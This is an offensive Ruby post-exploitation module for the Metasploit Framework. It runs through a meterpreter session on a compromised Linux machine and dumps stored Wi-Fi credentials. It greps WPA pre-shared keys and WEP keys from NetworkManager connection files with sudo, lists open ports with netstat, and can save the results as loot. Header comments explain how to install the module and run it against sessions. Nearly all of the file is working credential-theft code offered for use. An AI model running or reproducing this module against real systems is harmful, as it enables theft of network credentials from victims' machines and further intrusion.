##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##



##
# [ wifi_dump_linux.rb - ESSID credentials dump (wlan/lan) ]
# Author: pedr0 Ubuntu [r00t-3xp10it]
# tested on: linux Kali 2.0
#
#
# [ POST-EXPLOITATION MODULE DESCRIPTION ]
# This module collects 802-11-Wireless-Security credentials such as Access-Point name and Pre-Shared-Key
# from your target CLIENT Linux machine using /etc/NetworkManager/system-connections/ files. This module
# also gathers target open ports information and stores the dumps into msf loot folder (if selected)
# HINT: this module requires root privileges to run in non-Kali distros ..
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on => set SESSION 3
# Dump credentials of remote system?       => set DUMP_CREDS true
# Display remote target open ports?        => set OPEN_PORTS true
# Store credentials in msf loot folder?    => set STORE_CREDS true
# The default path for network connections => set REMOTE_DIR /etc/NetworkManager/system-connections
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/linux/gather/wifi_dump_linux.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/linux/gather/wifi_dump_linux.rb
# Manually Path Search: root@kali:~# locate modules/post/linux/gather
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/wlan/wifi_dump_linux
# msf post(wifi_dump_linux) > info
# msf post(wifi_dump_linux) > show options
# msf post(wifi_dump_linux) > show advanced options
# msf post(wifi_dump_linux) > set [option(s)]
# msf post(wifi_dump_linux) > exploit
#
#
# [ HINT ]
# In some linux distributions postgresql needs to be started and
# metasploit database deleted/rebuild to be abble to load module.
# 1 - service postgresql start
# 2 - msfdb reinit   (optional)
# 3 - msfconsole -x 'reload_all'
##





#
# Module Dependencies/requires
#
require 'rex'
require 'msf/core'
require 'msf/core/post/common'



#
# Metasploit Class name and includes
#
class MetasploitModule < Msf::Post
      Rank = GreatRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System



#
# Building Metasploit/Armitage info GUI/CLI
#
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'ESSID credentials dump (wpa/wep)',
                        'Description'   => %q{
                                        This module collects 802-11-Wireless-Security credentials such as Access-Point name and Pre-Shared-Key from your target CLIENT Linux machine using /etc/NetworkManager/system-connections/ files. This module also gathers target open ports information and stores the dumps into msf loot folder (if selected)
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'peterubuntu10[at]sourceforge[dot]net', # post-module author
                                ],
 
                        'Version'        => '$Revision: 1.2',
                        'DisclosureDate' => 'jun 7 2017',
                        'Platform'       => 'linux',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'true',  # root privs required in non-Kali distros
                        'Targets'        =>
                                [
                                         [ 'linux' ]
                                ],
                        'DefaultTarget'  => '1', # default its to run againts Kali 2.0
                        'References'     =>
                                [
                                         [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ]
                                ],
			'DefaultOptions' =>
				{
					'SESSION' => '1',   # Default its to run againts session 1
                                        'REMOTE_DIR' => '/etc/NetworkManager/system-connections',
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('DUMP_CREDS', [ false, 'Dump credentials of remote system', false])
                        ], self.class)

                register_advanced_options(
                        [
                                OptString.new('STORE_CREDS', [ false, 'Store credentials in msf loot folder?', false]),
                                OptString.new('OPEN_PORTS', [ false, 'Display remote target open ports?', false]),
                                OptString.new('REMOTE_DIR', [ true, 'The default path for network connections'])
                        ], self.class)
 
        end



#
# DUMP WLAN/WEP CREDENTIALS FROM TARGET ..
#
def ls_stage1

  rpath = datastore['REMOTE_DIR'] # /etc/NetworkManager/system-connections
  #
  # check for proper config settings enter...
  # to prevent 'unset all' from deleting default options...
  #
  if datastore['DUMP_CREDS'] == 'nil'
    vprint_error("Options not configurated correctly...")
    vprint_warning("Please set DUMP_CREDS option...")
    return nil
  else
    vprint_status("Dumping remote credentials ..")
    Rex::sleep(1.0)
  end

    #
    # Check if NetworkManager path exists ..
    #
    if not session.fs.dir.exist?(rpath)
      vprint_error("Remote path: #{rpath} not found ..")
      vprint_line("")
      return nil
    end

      #
      # Dump wifi credentials and network info from target system (wpa/wep)
      #
      wpa_out = cmd_exec("sudo grep psk= /etc/NetworkManager/system-connections/*")
      wep_out = cmd_exec("sudo grep wep-key0= /etc/NetworkManager/system-connections/*")
      open_ports = cmd_exec("/bin/netstat -tulpn")
      Rex::sleep(1.0)

        #
        # Display results on screen (wpa|wep) dump/gather info ..
        #
        vprint_line("")
        vprint_line("WPA CREDENTIALS:")
        vprint_line("----------------")
        vprint_line(wpa_out)
        vprint_line("")
        Rex::sleep(0.5)
        vprint_line("WEP CREDENTIALS:")
        vprint_line("----------------")
        vprint_line(wep_out)
        vprint_line("")
        Rex::sleep(0.5)

      #
      # Display target open ports ..
      #
      if datastore['OPEN_PORTS'] == true
        vprint_line("REMOTE OPEN PORTS:")
        vprint_line("----------------")
        vprint_line(open_ports)
        vprint_line("")
        Rex::sleep(0.5)
      end

    #
    # Store dump in msf loot folder ..
    # TODO: check if local loot file was created ..
    #
    if datastore['STORE_CREDS'] == true
      vprint_good("Downloading dump to msf loot folder ..")
      loot_path = store_loot("wpa/wep dump", "text/plain", session, wpa_out, wep_out, open_ports, "wpa/wep credentials dump")
      Rex::sleep(0.5)
      vprint_status("File stored in: #{loot_path}")
      vprint_line("")
      Rex::sleep(0.5)
    end

  #
  # error exception funtion
  #
  rescue ::Exception => e
  vprint_error("Error Running Command: #{e.class} #{e}")
  vprint_warning("Try to escalate session to [NT AUTHORITY/SYSTEM] before runing this module...")
end



#
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
#
def run
  session = client


      # Variable declarations (msf API calls)
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd


    # Print banner and scan results on screen
    vprint_line("    +--------------------------------------------+")
    vprint_line("    |     * ESSID WIFI PASSWORD DUMP LINUX *     |")
    vprint_line("    |            Author : r00t-3xp10it           |")
    vprint_line("    +--------------------------------------------+")
    vprint_line("")
    vprint_line("    Running on session  : #{datastore['SESSION']}")
    vprint_line("    Target Architecture : #{sysnfo['Architecture']}")
    vprint_line("    Computer            : #{sysnfo['Computer']}")
    vprint_line("    Operative System    : #{sysnfo['OS']}")
    vprint_line("    Target IP addr      : #{runsession}")
    vprint_line("    Payload directory   : #{directory}")
    vprint_line("    Client UID          : #{runtor}")
    vprint_line("")
    vprint_line("")


    #
    # the 'def check()' funtion that rapid7 requires to accept new modules.
    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
    #
    # check for proper operative system (Linux)
    #
    if not sysinfo['OS'] =~ /Linux/
      vprint_error("[ABORT]: This module only works againt Linux systems")
      return nil
    end
    #
    # Check if we are running in an higth integrity context (root)
    #
    if not is_root?
      vprint_error("[ABORT]: Root access is required to dump creds ..")
      return nil
    end
    #
    # check for proper session (meterpreter)
    # the non-return of sysinfo command reveals that we are not on a meterpreter session!
    #
    if not sysinfo.nil?
      vprint_status("Running module against: #{sysnfo['Computer']}")
    else
      vprint_error("[ABORT]: This module only works in meterpreter sessions!")
      return nil
    end


#
# Selected settings to run
#
      if datastore['DUMP_CREDS']
         ls_stage1
      end
   end
end
